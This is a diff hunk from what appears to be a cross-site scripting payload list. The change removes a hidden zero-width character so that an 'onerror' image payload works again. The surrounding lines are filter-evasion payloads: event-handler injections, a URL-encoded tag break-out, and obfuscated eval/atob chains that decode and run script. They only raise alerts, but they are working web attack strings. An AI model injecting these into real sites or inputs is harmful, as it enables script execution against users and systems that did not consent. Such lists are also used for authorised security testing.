@@ -186,7 +186,7 @@ javascript:alert’1’
 '"><img src=x onerror=alert()>
 "><input type="text" oncontentvisibilityautostatechange="confirm(/Bypassed/)">
 https:///%22%3E%3Cimg%20src=x%20onerror=alert(document.domain)%3E
-/</title><img src=x onerror​="alert('hacked')">
+/</title><img src=x onerror="alert('hacked')">
 <address onscrollsnapchange=window['ev'+'a'+(['l','b','c'][0])](window['a'+'to'+['b','c','d'][0]]('YWxlcnQob3JpZ2luKQ==')); style=overflow-y:hidden;scroll-snap-type:x><div style=scroll-snap-align:center>1337</div></address>
 /* </script> &#x3c;img/src/ <script>window[/al/.source+/ert/.source](origin);</script> /> */
 a=eval,c=["a"],x=["lert"],t=\${c}${x}(origin)`,http://a.call`1${t}``
